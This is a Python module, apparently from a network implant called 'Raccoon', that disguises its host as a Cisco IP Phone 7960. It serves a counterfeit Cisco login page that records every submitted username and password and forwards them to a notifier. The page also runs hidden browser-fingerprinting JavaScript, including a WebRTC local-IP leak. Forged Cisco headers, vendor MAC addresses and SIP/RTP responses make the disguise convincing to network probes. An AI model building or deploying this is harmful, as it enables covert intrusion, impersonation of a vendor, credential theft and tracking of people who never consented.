#!/usr/bin/env python3
"""
Cisco IP Phone 7960 cover identity.
Serves a Cisco-branded web interface with browser fingerprinting,
responds to SIP/RTP probes with realistic call flow.
Adapted for the Raccoon Implant.
"""

import base64
import json
import os
import socket
import threading
import time
import random
import logging
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from typing import Optional

logger = logging.getLogger("raccoon.cover")

STATIC_DIR = os.path.join(os.path.dirname(__file__), "static")

FINGERPRINT_JS = """
<script>
(function(){
    var d={ts:new Date().toISOString()};
    try{d.ua=navigator.userAgent}catch(e){}
    try{d.lang=navigator.language;d.langs=navigator.languages?navigator.languages.join(','):''}catch(e){}
    try{d.plat=navigator.platform}catch(e){}
    try{d.cores=navigator.hardwareConcurrency||0}catch(e){}
    try{d.mem=navigator.deviceMemory||0}catch(e){}
    try{d.sw=screen.width;d.sh=screen.height;d.cd=screen.colorDepth;
        d.aw=screen.availWidth;d.ah=screen.availHeight}catch(e){}
    try{d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
        d.tzo=new Date().getTimezoneOffset()}catch(e){}
    try{d.touch='ontouchstart'in window?1:0}catch(e){}
    try{d.dnt=navigator.doNotTrack||'unset'}catch(e){}
    try{d.cook=navigator.cookieEnabled?1:0}catch(e){}
    try{var c=document.createElement('canvas');var g=c.getContext('2d');
        c.width=200;c.height=50;g.textBaseline='top';
        g.font='14px Arial';g.fillStyle='#f60';g.fillRect(0,0,200,50);
        g.fillStyle='#069';g.fillText('Cisco7960fp',2,15);
        g.fillStyle='rgba(102,204,0,0.7)';g.fillText('Cisco7960fp',4,17);
        d.cvs=c.toDataURL().slice(-32)}catch(e){}
    try{var gl=document.createElement('canvas').getContext('webgl');
        if(gl){var dbg=gl.getExtension('WEBGL_debug_renderer_info');
        if(dbg){d.gpu=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)}}}catch(e){}
    try{d.plugins=[];for(var i=0;i<Math.min(navigator.plugins.length,10);i++){
        d.plugins.push(navigator.plugins[i].name)}}catch(e){}
    try{var r=window.RTCPeerConnection||window.webkitRTCPeerConnection;
        if(r){var pc=new r({iceServers:[]});
        pc.createDataChannel('');
        pc.createOffer().then(function(o){pc.setLocalDescription(o)});
        pc.onicecandidate=function(e){if(e&&e.candidate){
            var m=e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/);
            if(m){d.localip=m[1];send()}pc.onicecandidate=null;pc.close()}}}}catch(e){}
    function send(){
        var x=new XMLHttpRequest();
        x.open('POST','/.cisco-internal/fp',true);
        x.setRequestHeader('Content-Type','application/json');
        x.send(JSON.stringify(d));
    }
    setTimeout(send,500);
})();
</script>
"""


class CiscoLoginHandler(BaseHTTPRequestHandler):
    """HTTP handler mimicking the Cisco IP Phone 7960 web admin."""

    server_version = "Cisco-HTTP/1.1"

    def log_message(self, format, *args):
        logger.info("%s %s", self.client_address[0], format % args)

    def _send_cisco_headers(self):
        self.send_header("Server", "Cisco-HTTP/1.1")
        self.send_header("X-Cisco-Product", self.server.device_model)
        self.send_header("X-Cisco-Firmware", self.server.firmware_version)
        self.send_header("X-Frame-Options", "SAMEORIGIN")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")

    PROTECTED_PATHS = (
        "/", "/index.html", "/ccmadmin", "/ccmadmin/", "/cuadmin",
        "/deviceinfo", "/networksetup", "/streamstats",
    )

    def do_GET(self):
        if self.path in ("/favicon.ico", "/static/favicon.ico"):
            self._serve_static("cisco-favicon.ico", "image/x-icon")
        elif self.path in ("/static/cisco-wallpaper.png", "/cisco-wallpaper.png"):
            self._serve_static("cisco-wallpaper.png", "image/png")
        elif self.path in self.PROTECTED_PATHS or self.path.startswith("/ccm"):
            self._serve_login()
        else:
            self._serve_error(
                404, "Not Found",
                "The requested resource does not exist on this server.",
            )

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace")

        if self.path == "/.cisco-internal/fp":
            self._handle_fingerprint(body)
            return

        params = parse_qs(body)
        username = params.get("username", [""])[0]
        password = params.get("password", [""])[0]
        source_ip = self.client_address[0]
        user_agent = self.headers.get("User-Agent", "unknown")

        logger.warning(
            "Login attempt from %s — user=%s pass=%s ua=%s",
            source_ip, username, password, user_agent,
        )

        from software.notifications import get_notifier
        notifier = get_notifier()
        if notifier:
            notifier.notify(
                "credential",
                "Cisco Phone — Login Attempt",
                source=source_ip,
                username=username,
                password=password,
                user_agent=user_agent,
            )

        self._serve_login(error=True)

    def _handle_fingerprint(self, body):
        try:
            fp = json.loads(body)
            logger.warning(
                "Browser fingerprint from %s — %s",
                self.client_address[0], json.dumps(fp, ensure_ascii=False),
            )
            from software.notifications import get_notifier
            notifier = get_notifier()
            if notifier:
                notifier.notify(
                    "fingerprint",
                    "Cisco Phone — Browser Fingerprint",
                    source=self.client_address[0],
                    **fp,
                )
        except Exception:
            pass
        self.send_response(204)
        self.end_headers()

    def _serve_static(self, filename, content_type):
        filepath = os.path.join(STATIC_DIR, filename)
        try:
            with open(filepath, "rb") as f:
                data = f.read()
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Server", "Cisco-HTTP/1.1")
            self.send_header("Cache-Control", "public, max-age=3600")
            self.end_headers()
            self.wfile.write(data)
        except FileNotFoundError:
            self.send_error(404)

    def _serve_login(self, error=False):
        error_html = ""
        if error:
            error_html = (
                '<div class="error-msg">'
                'Login failed. Please check your username and password.'
                '</div>'
            )

        html = """<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<title>Login Page</title>
<link rel="shortcut icon" type="image/x-icon" href="/static/favicon.ico">
<link rel="icon" type="image/x-icon" href="/favicon.ico">
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
html,body{{height:100%;overflow:hidden}}
body{{font-family:Arial,Helvetica,sans-serif;
    background:url('/static/cisco-wallpaper.png') no-repeat center center fixed;
    background-size:cover;background-color:#1a3a5c;color:#fff}}
.page{{display:flex;flex-direction:column;height:100vh}}
.main{{flex:1;display:flex;align-items:flex-start;padding:calc(50vh - 180px) 60px 0}}
.title-block h1{{font-size:20px;font-weight:300;color:#fff;margin-bottom:3px}}
.title-block .version{{font-size:11px;font-weight:400;color:rgba(255,255,255,0.5)}}
.login-area{{margin-left:auto;padding:20px}}
.login-area table{{border-collapse:collapse}}
.login-area td{{padding:5px 8px;font-size:13px;color:#fff;white-space:nowrap}}
.login-area td.lbl{{text-align:right;font-weight:700}}
.login-area input[type="text"],.login-area input[type="password"]{{
    width:180px;padding:3px 5px;font-size:13px;border:1px solid #999;background:#fff;color:#333}}
.login-area select{{width:180px;padding:3px 5px;font-size:13px;border:1px solid #999;background:#fff;color:#333}}
.login-area .btn-row{{padding-top:8px}}
.login-btn{{padding:3px 16px;font-size:12px;cursor:pointer;
    background:#e8e8e8;border:1px solid #999;color:#333}}
.login-btn:hover{{background:#d0d0d0}}
.remember{{font-size:11px;color:rgba(255,255,255,0.8);padding-top:6px}}
.remember input{{margin-right:4px;vertical-align:middle}}
.error-msg{{background:rgba(220,53,69,0.9);color:#fff;padding:8px 12px;
    font-size:12px;margin-bottom:12px;border-radius:2px;max-width:320px}}
.footer{{background:rgba(0,0,0,0.4);padding:14px 60px;font-size:11px;color:rgba(255,255,255,0.6);
    line-height:1.5}}
</style></head><body>
<div class="page">
<div class="main">
    <div class="title-block">
        <h1>Phone Adapter Configuration Utility</h1>
        <div class="version">Version 1.1.0 (011)</div>
    </div>
    <div class="login-area">
        {error_html}
        <form method="POST" action="/">
        <table>
            <tr>
                <td class="lbl">Username:</td>
                <td>
                    <select id="username" name="username">
                        <option value="Admin" selected>Admin</option>
                        <option value="User">User</option>
                    </select>
                </td>
            </tr>
            <tr>
                <td class="lbl">Password:</td>
                <td><input type="password" id="password" name="password" required></td>
            </tr>
            <tr>
                <td></td>
                <td class="btn-row">
                    <input type="submit" class="login-btn" value="Log In">
                </td>
            </tr>
            <tr>
                <td></td>
                <td>
                    <label class="remember">
                        <input type="checkbox" name="remember">Remember Username
                    </label>
                </td>
            </tr>
        </table>
        </form>
    </div>
</div>
<div class="footer">
    &copy; 2012 Cisco Systems, Inc. All Rights Reserved.<br>
    Cisco, Cisco Systems, and the Cisco Systems logo are registered trademarks or trademarks of Cisco
    Systems, Inc. and/or its affiliates in the United States and certain other countries.
</div>
</div>
{fingerprint}
</body></html>""".format(
            model=self.server.device_model,
            firmware=self.server.firmware_version,
            mac=self.server.mac_address,
            fingerprint=FINGERPRINT_JS,
            error_html=error_html,
        )
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self._send_cisco_headers()
        self.send_header("Content-Length", str(len(html)))
        self.end_headers()
        self.wfile.write(html.encode())

    def _serve_error(self, code, title, description):
        html = """<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<title>{code} {title}</title>
<link rel="shortcut icon" type="image/x-icon" href="/static/favicon.ico">
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
html,body{{height:100%}}
body{{font-family:Arial,Helvetica,sans-serif;
    background:url('/static/cisco-wallpaper.png') no-repeat center center fixed;
    background-size:cover;background-color:#1a3a5c;color:#fff}}
.page{{display:flex;flex-direction:column;min-height:100vh}}
.main{{flex:1;display:flex;align-items:center;justify-content:center;padding:40px}}
.error-box{{background:rgba(0,0,0,0.5);padding:40px 50px;border-radius:4px;
    text-align:center;max-width:480px}}
.error-code{{font-size:64px;font-weight:700;margin-bottom:10px}}
.error-title{{font-size:20px;font-weight:600;margin-bottom:12px}}
.error-desc{{font-size:14px;color:rgba(255,255,255,0.75);line-height:1.5;margin-bottom:20px}}
.error-meta{{font-size:11px;color:rgba(255,255,255,0.5);margin-top:16px}}
.back-btn{{display:inline-block;padding:5px 20px;background:#e8e8e8;color:#333;
    border:1px solid #999;font-size:12px;text-decoration:none;cursor:pointer}}
.back-btn:hover{{background:#d0d0d0}}
.footer{{background:rgba(0,0,0,0.4);padding:14px 60px;font-size:11px;color:rgba(255,255,255,0.6);
    line-height:1.5}}
</style></head><body>
<div class="page">
<div class="main">
    <div class="error-box">
        <div class="error-code">{code}</div>
        <div class="error-title">{title}</div>
        <div class="error-desc">{description}</div>
        <a href="/" class="back-btn">Return to Login</a>
        <div class="error-meta">Server: Cisco-HTTP/1.1 &bull; {timestamp}</div>
    </div>
</div>
<div class="footer">
    &copy; 2012 Cisco Systems, Inc. All Rights Reserved.<br>
    Cisco, Cisco Systems, and the Cisco Systems logo are registered trademarks or trademarks of Cisco
    Systems, Inc. and/or its affiliates in the United States and certain other countries.
</div>
</div>
{fingerprint}
</body></html>""".format(
            code=code,
            title=title,
            description=description,
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            fingerprint=FINGERPRINT_JS,
        )
        self.send_response(code)
        self.send_header("Content-Type", "text/html")
        self._send_cisco_headers()
        self.send_header("Content-Length", str(len(html)))
        self.end_headers()
        self.wfile.write(html.encode())


class CiscoCover:
    """Manages the Cisco IP Phone cover identity (HTTP + SIP)."""

    CISCO_OUIS = ["00:0E:38", "00:1B:D5", "00:26:98", "00:50:73"]

    def __init__(self, config: dict):
        self.host = "0.0.0.0"
        cisco_cfg = config["cover"].get("cisco_phone", config["cover"])
        self.http_port = cisco_cfg.get("http_port", 80)
        self.sip_port = cisco_cfg.get("sip_port", 5060)
        self.rtp_port = cisco_cfg.get("rtp_port", 10000)

        self.device_model = cisco_cfg.get("model", "Cisco IP Phone 7960")
        self.firmware_version = cisco_cfg.get("firmware", "P0S3-08-12-00")
        self.mac_address = self._generate_cisco_mac(cisco_cfg.get("mac_prefix", "00:1b:d5"))
        self.device_name = cisco_cfg.get("hostname", f"SEP{self.mac_address.replace(':', '')}")

        self._running = False
        self._threads: list[threading.Thread] = []
        self._sip_socket: Optional[socket.socket] = None

        self._in_call = False
        self._call_id: Optional[str] = None
        self._caller_ip: Optional[str] = None
        self._caller_rtp_port: Optional[int] = None
        self._rtp_rx = 0
        self._rtp_tx = 0
        self._last_invite_info: Optional[dict] = None
        self._last_invite_addr: Optional[tuple] = None

    def _generate_cisco_mac(self, mac_prefix: str = None) -> str:
        prefix = mac_prefix.upper() if mac_prefix else random.choice(self.CISCO_OUIS)
        suffix = ":".join(f"{random.randint(0, 255):02X}" for _ in range(3))
        return f"{prefix}:{suffix}"

    def _run_http(self):
        server = HTTPServer((self.host, self.http_port), CiscoLoginHandler)
        server.device_model = self.device_model
        server.firmware_version = self.firmware_version
        server.mac_address = self.mac_address
        logger.info("HTTP admin interface on :%d", self.http_port)
        server.serve_forever()

    # ── SIP ──

    def _parse_sip(self, msg: str) -> dict:
        info = {
            "call_id": "unknown", "cseq": "1 OPTIONS",
            "via": "SIP/2.0/UDP", "from": "", "to": "",
            "contact": "", "from_tag": "", "rtp_port": None,
        }
        for line in msg.split("\r\n"):
            if line.startswith("Call-ID:"):
                info["call_id"] = line.split(":", 1)[1].strip()
            elif line.startswith("CSeq:"):
                info["cseq"] = line.split(":", 1)[1].strip()
            elif line.startswith("Via:"):
                info["via"] = line.split(":", 1)[1].strip()
            elif line.startswith("From:"):
                info["from"] = line.split(":", 1)[1].strip()
                if "tag=" in line:
                    info["from_tag"] = line.split("tag=")[1].split(";")[0].split(">")[0].strip()
            elif line.startswith("To:"):
                info["to"] = line.split(":", 1)[1].strip()
            elif line.startswith("Contact:"):
                info["contact"] = line.split(":", 1)[1].strip()
            elif line.startswith("m=audio"):
                parts = line.split()
                if len(parts) > 1:
                    try:
                        info["rtp_port"] = int(parts[1])
                    except ValueError:
                        pass
        return info

    def _sip_respond(self, sock, addr, info, code, text, sdp=None):
        local_ip = self._get_local_ip()
        to_tag = str(random.randint(1000000, 9999999))
        response = (
            f"SIP/2.0 {code} {text}\r\n"
            f"Via: {info['via']}\r\n"
            f"From: {info['from']}\r\n"
            f"To: <sip:{self.device_name}@{local_ip}>;tag={to_tag}\r\n"
            f"Call-ID: {info['call_id']}\r\n"
            f"CSeq: {info['cseq']}\r\n"
            f"Contact: <sip:{self.device_name}@{local_ip}:{self.sip_port}>\r\n"
            f"Server: Cisco-SIPGateway/IOS-{self.firmware_version}\r\n"
            f"Allow: INVITE, ACK, BYE, CANCEL, OPTIONS, INFO\r\n"
        )
        if sdp:
            response += f"Content-Type: application/sdp\r\n"
            response += f"Content-Length: {len(sdp)}\r\n\r\n"
            response += sdp
        else:
            response += "Content-Length: 0\r\n\r\n"
        sock.sendto(response.encode(), addr)

    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "0.0.0.0"

    def _handle_invite(self, sock, addr, msg):
        info = self._parse_sip(msg)
        logger.info("SIP INVITE from %s:%d", *addr)

        self._call_id = info["call_id"]
        self._caller_ip = addr[0]
        self._caller_rtp_port = info.get("rtp_port")

        self._sip_respond(sock, addr, info, 100, "Trying")
        time.sleep(0.1)

        self._sip_respond(sock, addr, info, 180, "Ringing")
        time.sleep(0.3)

        local_ip = self._get_local_ip()
        sdp = (
            f"v=0\r\n"
            f"o={self.device_name} {random.randint(100000, 999999)} "
            f"{random.randint(100000, 999999)} IN IP4 {local_ip}\r\n"
            f"s=Cisco IP Phone\r\n"
            f"c=IN IP4 {local_ip}\r\n"
            f"t=0 0\r\n"
            f"m=audio {self.rtp_port} RTP/AVP 0\r\n"
            f"a=rtpmap:0 PCMU/8000\r\n"
            f"a=ptime:20\r\n"
        )
        self._sip_respond(sock, addr, info, 200, "OK", sdp)
        self._last_invite_info = info
        self._last_invite_addr = addr
        logger.info("SIP call accepted — RTP port %d, caller %s:%s",
                     self.rtp_port, self._caller_ip, self._caller_rtp_port)

    def _handle_cancel(self, sock, addr, msg):
        """RFC 3261 CANCEL: 200 OK for the CANCEL itself, then 487 for the INVITE."""
        info = self._parse_sip(msg)
        self._sip_respond(sock, addr, info, 200, "OK")

        if self._last_invite_info and self._last_invite_info["call_id"] == info["call_id"]:
            invite_info = self._last_invite_info
            invite_addr = self._last_invite_addr or addr
            self._sip_respond(sock, invite_addr, invite_info, 487, "Request Terminated")

        self._in_call = False
        self._call_id = None
        self._caller_ip = None
        self._caller_rtp_port = None
        self._last_invite_info = None
        self._last_invite_addr = None
        logger.info("SIP CANCEL from %s — call cancelled, 487 sent", addr[0])

    def _handle_ack(self, addr):
        logger.info("SIP ACK from %s — starting RTP echo session", addr[0])
        self._in_call = True
        self._rtp_rx = 0
        self._rtp_tx = 0
        rtp_t = threading.Thread(target=self._rtp_echo_session, daemon=True, name="cisco-rtp")
        rtp_t.start()

    def _handle_bye(self, sock, addr, msg):
        info = self._parse_sip(msg)
        logger.info("SIP BYE from %s — call terminated (RX=%d TX=%d)",
                     addr[0], self._rtp_rx, self._rtp_tx)
        self._in_call = False
        self._sip_respond(sock, addr, info, 200, "OK")
        self._call_id = None
        self._caller_ip = None
        self._caller_rtp_port = None

    # ── RTP ──

    def _rtp_echo_session(self):
        """RTP echo — receives packets and sends them back to the caller."""
        logger.info("RTP echo session started on :%d", self.rtp_port)

        rtp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        rtp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        rtp_sock.bind((self.host, self.rtp_port))
        rtp_sock.settimeout(0.1)

        caller_addr = None
        start_time = time.time()

        while self._in_call and self._running:
            try:
                data, addr = rtp_sock.recvfrom(2048)
                self._rtp_rx += 1

                if caller_addr is None:
                    caller_addr = addr
                    logger.info("RTP first packet from %s:%d", *addr)

                if caller_addr:
                    rtp_sock.sendto(data, caller_addr)
                    self._rtp_tx += 1

                if self._rtp_rx % 100 == 0:
                    elapsed = time.time() - start_time
                    logger.info("RTP stats: RX=%d TX=%d duration=%.1fs",
                                self._rtp_rx, self._rtp_tx, elapsed)

            except socket.timeout:
                continue
            except Exception as e:
                logger.error("RTP error: %s", e)
                break

        rtp_sock.close()
        elapsed = time.time() - start_time
        logger.info("RTP echo session ended — RX=%d TX=%d duration=%.1fs",
                     self._rtp_rx, self._rtp_tx, elapsed)

    # ── SIP listener ──

    def _run_sip(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((self.host, self.sip_port))
        sock.settimeout(1.0)
        self._sip_socket = sock
        logger.info("SIP listener on :%d", self.sip_port)

        while self._running:
            try:
                data, addr = sock.recvfrom(4096)
                msg = data.decode("utf-8", errors="ignore")
                logger.debug("SIP from %s:%d", *addr)

                if msg.startswith("INVITE"):
                    self._handle_invite(sock, addr, msg)
                elif msg.startswith("ACK"):
                    self._handle_ack(addr)
                elif msg.startswith("BYE"):
                    self._handle_bye(sock, addr, msg)
                elif msg.startswith("CANCEL"):
                    self._handle_cancel(sock, addr, msg)
                elif msg.startswith("OPTIONS"):
                    info = self._parse_sip(msg)
                    self._sip_respond(sock, addr, info, 200, "OK")
                elif msg.startswith("REGISTER"):
                    info = self._parse_sip(msg)
                    self._sip_respond(sock, addr, info, 200, "OK")
                else:
                    info = self._parse_sip(msg)
                    self._sip_respond(sock, addr, info, 405, "Method Not Allowed")
            except socket.timeout:
                continue
            except Exception as e:
                logger.error("SIP error: %s", e)

        sock.close()

    # ── Lifecycle ──

    def start(self):
        self._running = True

        http_t = threading.Thread(target=self._run_http, daemon=True, name="cisco-http")
        sip_t = threading.Thread(target=self._run_sip, daemon=True, name="cisco-sip")

        self._threads = [http_t, sip_t]
        for t in self._threads:
            t.start()

        logger.info(
            "Cover active: %s (%s) MAC=%s",
            self.device_model, self.firmware_version, self.mac_address,
        )

    def stop(self):
        self._running = False
        logger.info("Cover services stopping")
